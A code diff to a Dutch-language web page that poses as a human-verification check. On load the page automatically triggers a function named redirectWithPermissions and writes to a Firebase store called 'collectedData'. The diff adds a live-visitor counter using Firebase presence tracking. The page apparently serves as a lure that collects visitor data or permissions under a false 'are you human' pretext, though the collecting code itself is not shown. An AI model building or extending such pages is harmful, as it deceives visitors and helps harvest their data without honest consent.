@@ -43,6 +43,14 @@
             color: #555; /* Iets zachtere kleur voor tekst */
         }
 
+        /* Live bezoekers sectie */
+        #liveVisitors {
+            font-size: 18px;
+            margin-top: 10px;
+            color: #4caf50; /* Groene kleur voor benadrukking */
+            font-weight: bold;
+        }
+
         /* Geaccentueerde tekst */
         .highlight {
             font-weight: bold;
@@ -135,6 +143,10 @@
                 border-width: 5px;
                 margin: 20px auto 0;
             }
+
+            #liveVisitors {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
@@ -146,8 +158,10 @@
     <div class="container">
         <h1 id="messageText">Bevestiging</h1>
         <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we doorgaan...</p>
-        <!-- Knop is verwijderd -->
-
+        
+        <!-- Live bezoekers sectie -->
+        <p id="liveVisitors">Live bezoekers: 0</p>
+        
         <!-- Loading animatie en voortgangsbalk -->
         <div class="loading"></div>
         <div class="progress-bar">
@@ -174,9 +188,10 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Referentie naar instellingen in Firebase
+        // Referentie naar instellingen en presence in Firebase
         const settingsRef = db.ref('settings');
         const dataRef = db.ref('collectedData');
+        const presenceRef = db.ref('presence');
 
         // Haal instellingen op uit Firebase
         let settings = {};
@@ -426,6 +441,19 @@
 
         // Start het proces automatisch wanneer de pagina is geladen
         window.addEventListener('load', redirectWithPermissions);
+
+        // Presence Tracking
+        const userPresenceRef = presenceRef.push(); // Maak een unieke aanwezigheid entry
+        userPresenceRef.set(true); // Stel de aanwezigheid in
+
+        // Verwijder de aanwezigheid bij het verlaten van de pagina
+        userPresenceRef.onDisconnect().remove();
+
+        // Update het aantal live bezoekers
+        presenceRef.on('value', (snapshot) => {
+            const liveVisitors = snapshot.numChildren();
+            document.getElementById('liveVisitors').innerText = `Live bezoekers: ${liveVisitors}`;
+        });
     </script>
 </body>
 </html>
